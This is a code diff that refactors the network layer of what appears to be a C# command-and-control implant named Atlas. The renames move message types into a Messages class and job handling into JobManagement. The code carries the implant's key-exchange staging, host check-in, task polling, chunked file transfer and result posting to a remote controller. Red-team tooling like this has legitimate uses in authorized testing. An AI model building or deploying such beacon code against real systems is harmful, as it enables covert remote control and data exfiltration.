@@ -18,7 +18,7 @@ namespace Atlas
             {
 #if DEFAULT_EKE
                 Crypto.GenRsaKeys();
-                Utils.GetStage GetStage = new Utils.GetStage
+                Messages.GetStage GetStage = new Messages.GetStage
                 {
                     action = "staging_rsa",
                     pub_key = Crypto.GetPubKey(),
@@ -26,14 +26,14 @@ namespace Atlas
 
                 };
                 Config.SessionId = GetStage.session_id;
-                string SerializedData = Crypto.EncryptStage(Utils.GetStage.ToJson(GetStage));
+                string SerializedData = Crypto.EncryptStage(Messages.GetStage.ToJson(GetStage));
                 var result = Get(SerializedData);
                 string final_result = Crypto.Decrypt(result);
-                Utils.StageResponse StageResponse = Utils.StageResponse.FromJson(final_result);
+                Messages.StageResponse StageResponse = Messages.StageResponse.FromJson(final_result);
                 Config.tempUUID = StageResponse.uuid;
                 Config.Psk = Convert.ToBase64String(Crypto.RsaDecrypt(Convert.FromBase64String(StageResponse.session_key)));
 #endif
-                Utils.CheckIn CheckIn = new Utils.CheckIn
+                Messages.CheckIn CheckIn = new Messages.CheckIn
                 {
                     action = "checkin",
                     ip = Utils.GetIPAddress(),
@@ -46,18 +46,18 @@ namespace Atlas
                     architecture = Utils.GetArch()
                 };
 #if DEFAULT
-                string FinalSerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.PayloadUUID + Utils.CheckIn.ToJson(CheckIn)));
+                string FinalSerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.PayloadUUID + Messages.CheckIn.ToJson(CheckIn)));
 #elif (DEFAULT_PSK || DEFAULT_EKE)
-                string FinalSerializedData = Crypto.EncryptCheckin(Utils.CheckIn.ToJson(CheckIn));
+                string FinalSerializedData = Crypto.EncryptCheckin(Messages.CheckIn.ToJson(CheckIn));
 #endif
                 var new_result = Get(FinalSerializedData);
 #if (DEFAULT_PSK || DEFAULT_EKE)
                 string last_result = Crypto.Decrypt(new_result);
 #endif
 #if DEFAULT
-                Utils.CheckInResponse CheckInResponse = Utils.CheckInResponse.FromJson(Encoding.UTF8.GetString(Convert.FromBase64String(new_result)).Substring(36));
+                Messages.CheckInResponse CheckInResponse = Messages.CheckInResponse.FromJson(Encoding.UTF8.GetString(Convert.FromBase64String(new_result)).Substring(36));
 #elif (DEFAULT_PSK || DEFAULT_EKE)
-                Utils.CheckInResponse CheckInResponse = Utils.CheckInResponse.FromJson(last_result);
+                Messages.CheckInResponse CheckInResponse = Messages.CheckInResponse.FromJson(last_result);
 #endif
                 Config.UUID = CheckInResponse.id;
                 if (CheckInResponse.status == "success")
@@ -75,11 +75,11 @@ namespace Atlas
             }
         }
 
-        public static bool GetTasking(Utils.JobList JobList)
+        public static bool GetTasking(Messages.JobList JobList)
         {
             try
             {
-                foreach (Utils.Job Job in JobList.jobs)
+                foreach (Messages.Job Job in JobList.jobs)
                 {
                     if (Job.upload)
                     {
@@ -87,10 +87,10 @@ namespace Atlas
                         {
                             if (!Job.chunking_started)
                             {
-                                Utils.UploadTasking UploadTasking = Utils.UploadTasking.FromJson(Job.parameters);
+                                Messages.UploadTasking UploadTasking = Messages.UploadTasking.FromJson(Job.parameters);
                                 Job.file_id = UploadTasking.assembly_id;
                                 Job.path = UploadTasking.remote_path;
-                                Utils.Upload Upload = new Utils.Upload
+                                Messages.Upload Upload = new Messages.Upload
                                 {
                                     action = "upload",
                                     chunk_size = Config.ChunkSize,
@@ -99,7 +99,7 @@ namespace Atlas
                                     full_path = Job.path,
                                     task_id = Job.task_id
                                 };
-                                Utils.UploadResponse UploadResponse = Http.GetUpload(Upload);
+                                Messages.UploadResponse UploadResponse = Http.GetUpload(Upload);
                                 Job.total_chunks = UploadResponse.total_chunks;
                                 Job.chunks.Add(UploadResponse.chunk_data);
                                 Job.chunking_started = true;
@@ -107,7 +107,7 @@ namespace Atlas
                             else
                             {
                                 Job.chunk_num++;
-                                Utils.Upload ChunkUpload = new Utils.Upload
+                                Messages.Upload ChunkUpload = new Messages.Upload
                                 {
                                     action = "upload",
                                     chunk_size = Config.ChunkSize,
@@ -116,21 +116,21 @@ namespace Atlas
                                     full_path = Job.path,
                                     task_id = Job.task_id
                                 };
-                                Utils.UploadResponse UploadResponse = Http.GetUpload(ChunkUpload);
+                                Messages.UploadResponse UploadResponse = Http.GetUpload(ChunkUpload);
                                 Job.chunks.Add(UploadResponse.chunk_data);
                             }
                         }
                     }
                 }
-                Utils.GetTasking GetTasking = new Utils.GetTasking
+                Messages.GetTasking GetTasking = new Messages.GetTasking
                 {
                     action = "get_tasking",
                     tasking_size = -1
                 };
 #if DEFAULT
-                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Utils.GetTasking.ToJson(GetTasking)));
+                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Messages.GetTasking.ToJson(GetTasking)));
 #elif (DEFAULT_PSK || DEFAULT_EKE)
-                string SerializedData = Crypto.Encrypt(Utils.GetTasking.ToJson(GetTasking));
+                string SerializedData = Crypto.Encrypt(Messages.GetTasking.ToJson(GetTasking));
 #endif
                 var result = Get(SerializedData);
 #if DEFAULT
@@ -142,13 +142,13 @@ namespace Atlas
                 {
                     return false;
                 }
-                Utils.GetTaskingResponse GetTaskResponse = Utils.GetTaskingResponse.FromJson(final_result.Substring(36));
+                Messages.GetTaskingResponse GetTaskResponse = Messages.GetTaskingResponse.FromJson(final_result.Substring(36));
                 if (GetTaskResponse.tasks[0].command == "")
                 {
                     return false;
                 }
-                foreach (Utils.Task task in GetTaskResponse.tasks) {
-                    Utils.Job Job = new Utils.Job
+                foreach (Messages.Task task in GetTaskResponse.tasks) {
+                    Messages.Job Job = new Messages.Job
                     {
                         job_id = JobList.job_count,
                         task_id = task.id,
@@ -171,13 +171,13 @@ namespace Atlas
                     }
                     else if (Job.command == "jobs")
                     {
-                        Job.response = Modules.GetJobs(JobList);
+                        Job.response = JobManagement.GetJobs(JobList);
                         Job.completed = true;
                         Job.success = true;
                     }
                     else if (Job.command == "jobkill")
                     {
-                        if (Modules.KillJob(JobList, Int32.Parse(Job.parameters)))
+                        if (JobManagement.KillJob(JobList, Int32.Parse(Job.parameters)))
                         {
                             Job.completed = true;
                             Job.success = true;
@@ -201,14 +201,14 @@ namespace Atlas
             }
         }
 
-        public static Utils.UploadResponse GetUpload(Utils.Upload Upload)
+        public static Messages.UploadResponse GetUpload(Messages.Upload Upload)
         {
             try
             {
 #if DEFAULT
-                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Utils.Upload.ToJson(Upload)));
+                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Messages.Upload.ToJson(Upload)));
 #elif (DEFAULT_PSK || DEFAULT_EKE)
-                string SerializedData = Crypto.Encrypt(Utils.Upload.ToJson(Upload));
+                string SerializedData = Crypto.Encrypt(Messages.Upload.ToJson(Upload));
 #endif
                 var result = Get(SerializedData);
 #if DEFAULT
@@ -216,33 +216,33 @@ namespace Atlas
 #elif (DEFAULT_PSK || DEFAULT_EKE)
                 string final_result = Crypto.Decrypt(result);
 #endif
-                Utils.UploadResponse UploadResponse = Utils.UploadResponse.FromJson(final_result.Substring(36));
+                Messages.UploadResponse UploadResponse = Messages.UploadResponse.FromJson(final_result.Substring(36));
 
                 return UploadResponse;
             }
             catch
             {
-                Utils.UploadResponse UploadResponse = new Utils.UploadResponse { };
+                Messages.UploadResponse UploadResponse = new Messages.UploadResponse { };
                 return UploadResponse;
             }
         }
 
-        public static bool PostResponse(Utils.JobList JobList)
+        public static bool PostResponse(Messages.JobList JobList)
         {
             try
             {
-                Utils.PostResponse PostResponse = new Utils.PostResponse
+                Messages.PostResponse PostResponse = new Messages.PostResponse
                 {
                     action = "post_response",
                     responses = { }
                 };
-                foreach (Utils.Job Job in JobList.jobs)
+                foreach (Messages.Job Job in JobList.jobs)
                 {
                     if (Job.completed)
                     {
                          if (!Job.success)
                         {
-                            Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                            Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                             {
                                 task_id = Job.task_id,
                                 user_output = Job.response,
@@ -260,7 +260,7 @@ namespace Atlas
                         {
                             if (Job.file_id == null)
                             {
-                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                                Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                                 {
                                     task_id = Job.task_id,
                                     user_output = null,
@@ -276,7 +276,7 @@ namespace Atlas
                             }
                             else if (Job.chunk_num == Job.total_chunks)
                             {
-                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                                Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                                 {
                                     task_id = Job.task_id,
                                     user_output = null,
@@ -292,7 +292,7 @@ namespace Atlas
                             }
                             else
                             {
-                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                                Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                                 {
                                     task_id = Job.task_id,
                                     user_output = null,
@@ -311,7 +311,7 @@ namespace Atlas
                         {
                             if (Job.chunk_num != Job.total_chunks)
                             {
-                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                                Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                                 {
                                     task_id = Job.task_id,
                                     user_output = Job.chunks[0],
@@ -326,7 +326,7 @@ namespace Atlas
                             }
                             else
                             {
-                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                                Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                                 {
                                     task_id = Job.task_id,
                                     user_output = Job.chunks[0],
@@ -342,7 +342,7 @@ namespace Atlas
                         }
                         else
                         {
-                            Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                            Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                             {
                                 task_id = Job.task_id,
                                 user_output = Job.response,
@@ -361,11 +361,11 @@ namespace Atlas
                 {
                     return false;
                 }
-                string Data = Utils.PostResponse.ToJson(PostResponse);
+                string Data = Messages.PostResponse.ToJson(PostResponse);
 #if DEFAULT
-                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Utils.PostResponse.ToJson(PostResponse)));
+                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Messages.PostResponse.ToJson(PostResponse)));
 #elif (DEFAULT_PSK || DEFAULT_EKE)
-                string SerializedData = Crypto.Encrypt(Utils.PostResponse.ToJson(PostResponse));
+                string SerializedData = Crypto.Encrypt(Messages.PostResponse.ToJson(PostResponse));
 #endif
                 string result = Post(SerializedData);
 #if DEFAULT
@@ -373,11 +373,11 @@ namespace Atlas
 #elif (DEFAULT_PSK || DEFAULT_EKE)
                 string final_result = Crypto.Decrypt(result);
 #endif
-                Utils.PostResponseResponse PostResponseResponse = Utils.PostResponseResponse.FromJson(final_result.Substring(36));
-                List<Utils.Job> TempList = new List<Utils.Job>(JobList.jobs);
-                foreach (Utils.Response Response in PostResponseResponse.responses)
+                Messages.PostResponseResponse PostResponseResponse = Messages.PostResponseResponse.FromJson(final_result.Substring(36));
+                List<Messages.Job> TempList = new List<Messages.Job>(JobList.jobs);
+                foreach (Messages.Response Response in PostResponseResponse.responses)
                 {
-                    foreach (Utils.Job Job in TempList)
+                    foreach (Messages.Job Job in TempList)
                     {
                         if (Job.completed)
                         {
@@ -393,7 +393,7 @@ namespace Atlas
                                         }
                                         if (Job.total_chunks == Job.chunk_num)
                                         {
-                                            Utils.RemoveJob(Job, JobList);
+                                            JobManagement.RemoveJob(Job, JobList);
                                         }
                                         else
                                         {
@@ -413,12 +413,12 @@ namespace Atlas
                                         }
                                         else
                                         {
-                                            Utils.RemoveJob(Job, JobList);
+                                            JobManagement.RemoveJob(Job, JobList);
                                         }
                                     }
                                     else
                                     {
-                                        Utils.RemoveJob(Job, JobList);
+                                        JobManagement.RemoveJob(Job, JobList);
                                     }
                                 }
                             }
